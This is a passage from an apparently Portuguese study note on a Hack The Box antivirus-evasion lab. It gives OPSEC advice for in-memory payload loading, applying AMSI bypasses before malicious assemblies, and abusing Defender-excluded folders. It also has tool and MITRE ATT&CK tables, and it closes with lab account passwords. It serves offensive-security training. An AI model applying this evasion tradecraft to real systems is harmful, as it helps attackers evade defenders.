- Assembly carregado sem arquivo correspondente em disco (anomalia detectável por EDR)
- `[System.Reflection.Assembly]::Load()` sem path de arquivo

### Considerações de OPSEC por Fase

**Desenvolvimento (em EVASION-DEV):**
- C:\Tools\ tem exclusão do Defender — seguro para desenvolver sem que os arquivos sejam apagados
- Nunca copiar payloads em desenvolvimento para o Desktop ou outros locais sem exclusão

**Transferência para alvo:**
- Preferir download em memória (`IEX`, `[System.Reflection.Assembly]::Load()`) em vez de
  escrever em disco
- Se precisar escrever em disco, escolher diretório com exclusão ou usar C:\Windows\Tasks\

**Execução:**
- Aplicar AMSI bypass **antes** de carregar qualquer assembly ou script malicioso
- Usar AMSI bypass que patcha amsi.dll quando for usar carregamento reflexivo
- Limpar artefatos (registry keys, arquivos temporários) após completar objetivos

---

## Módulos Relacionados

### Relação com Outros Documentos Desta Base

| Tópico | Documento |
|--------|-----------|
| AMSI — teoria aprofundada, bypass via hardware breakpoints, ETW | `03_amsi_bypass.md` |
| AppLocker — arquitetura interna, bypass via trusted folders, CLM | `04_applocker_bypass.md` |
| Process injection — técnicas avançadas (hollowing, ghostwriting) | `05_injecao_de_processo/` |
| EDR hooking e unhooking | `06_edr_telemetria_e_hooking.md` |
| Evasão em runtime (sleepmask, heap encryption) | `08_runtime_evasion_sleepmask.md` |

### Ferramentas Mencionadas no Módulo HTB

| Ferramenta | Propósito | Localização (EVASION-DEV) |
|------------|-----------|---------------------------|
| ThreatCheck | Identificar bytes detectados pelo Defender | C:\Tools\ThreatCheck-master\ |
| micr0_shell | Gerar shellcode PIC null-free alternativo | C:\Tools\micr0_shell\ |
| dnSpy | Decompilação de assemblies .NET | C:\Tools\dnSpy-net-win64\ |
| IDA Freeware | Engenharia reversa de binários nativos | C:\Tools\IDA Freeware 8.4\ |
| Sysinternals Suite | sigcheck, procmon, etc. | C:\Tools\SysinternalsSuite\ |
| ExpandDefenderSig.ps1 | Explorar banco de assinaturas do Defender | C:\Tools\ |
| WinPwnage | 15 UAC bypasses em Python | Referência externa |
| CyberChef | Criptografia/compressão de payloads | https://gchq.github.io/CyberChef/ |

### MITRE ATT&CK Mapeamento

| Técnica | ID MITRE | Descrição |
|---------|----------|-----------|
| Static AV Evasion | T1027 | Obfuscated Files or Information |
| Shellcode Encryption | T1027.002 | Software Packing |
| Process Injection | T1055 | Process Injection |
| Reflective DLL Loading | T1620 | Reflective Code Loading |
| AMSI Bypass | T1562.001 | Impair Defenses: Disable or Modify Tools |
| UAC Bypass (Scheduled Task) | T1548.002 | Abuse Elevation Control Mechanism: Bypass UAC |
| UAC Bypass (FodHelper) | T1548.002 | Abuse Elevation Control Mechanism: Bypass UAC |
| InstallUtil LOLBAS | T1218.004 | System Binary Proxy Execution: InstallUtil |
| RunDll32 LOLBAS | T1218.011 | System Binary Proxy Execution: RunDll32 |
| AppLocker Bypass | T1562.001 | Impair Defenses |

### Ordem Recomendada de Estudo

1. **`03_amsi_bypass.md`** — Entender AMSI em profundidade antes das técnicas HTB
2. **`04_applocker_bypass.md`** — Arquitetura do AppLocker e CLM
3. **Este documento** — Aplicação prática: payload C#, UAC bypass, LOLBINs
4. **`05_injecao_de_processo/`** — Técnicas avançadas de process injection
5. **`06_edr_telemetria_e_hooking.md`** — Como EDRs detectam o que o Defender não vê

### Recursos Externos

- **LOLBAS Project:** https://lolbas-project.github.io/ — Referência completa de LOLBINs
- **WinPwnage:** 15 implementações Python de UAC bypasses
- **micr0_shell:** https://github.com/senzee1984/micr0_shell
- **DllExport:** https://github.com/3F/DllExport — Exportar funções de DLLs .NET
- **ExpandDefenderSig.ps1:** Explorar banco de assinaturas do Defender indiretamente
- **Atomic Red Team T1218.004:** https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md

---

*Nota: As ferramentas no ambiente de lab HTB estão em `C:\Tools\` no EVASION-DEV VM.
As credenciais do lab são: Administrator/Eva$i0n!, maria/Eva$i0n! (admin), max/Eva$i0n! (user padrão).
No EVASION-TARGET, o usuário inicial é alpha/FGQxrLW2 e os exercícios são entregues em subpastas de `C:\Alpha\`.*
